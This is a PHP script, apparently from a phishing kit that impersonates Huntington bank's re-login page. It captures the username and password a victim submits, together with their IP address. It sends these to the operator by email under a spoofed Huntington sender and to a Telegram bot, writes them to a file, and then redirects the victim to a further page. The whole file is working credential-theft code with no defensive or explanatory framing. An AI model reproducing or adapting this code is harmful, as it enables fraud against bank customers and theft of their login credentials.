<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "»»————-　★[ ⚫️🌀 Huntington® Re-Login ⚫️🌀 ]★　————-««\n";
$message .= "Username: ".$_POST['Username2']."\n";;
$message .= "Password: ".$_POST['Password2']."\n";;
$message .= "Ip: $ip\n";
$message .= "»»————-　★[ ⚫️🌀 Huntington® Re-Login ⚫️🌀 ]★　————-««\n";
$subject = "Huntington® Re-Login | $ip ";
$headers = "From:Huntington <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: ../SQ.php?id=ED8498740983x&pjJab&doZ-aD4OVaGzTZ9vaZaPTjsbedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");

include "Telegram.php";

?>